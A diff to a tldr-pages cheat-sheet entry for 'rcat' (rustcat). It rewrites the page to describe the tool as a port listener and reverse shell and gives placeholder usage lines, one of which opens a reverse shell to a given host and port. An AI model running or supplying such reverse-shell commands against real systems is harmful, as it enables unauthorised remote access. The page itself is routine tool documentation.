@@ -1,7 +1,13 @@
 # rcat
 
-> This command is an alias of `rc`.
+> A modern simplistic port listener & reverse shell.
+> See also: `nc`.
+> More information: <https://github.com/robiot/rustcat/wiki/Basic-Usage>.
 
-- View documentation for the original command:
+- Start listening on a specific port:
 
-`tldr rc`
+`rcat listen {{port}}`
+
+- Start a reverse shell:
+
+`rcat connect -s {{shell}} {{host}} {{port}}`
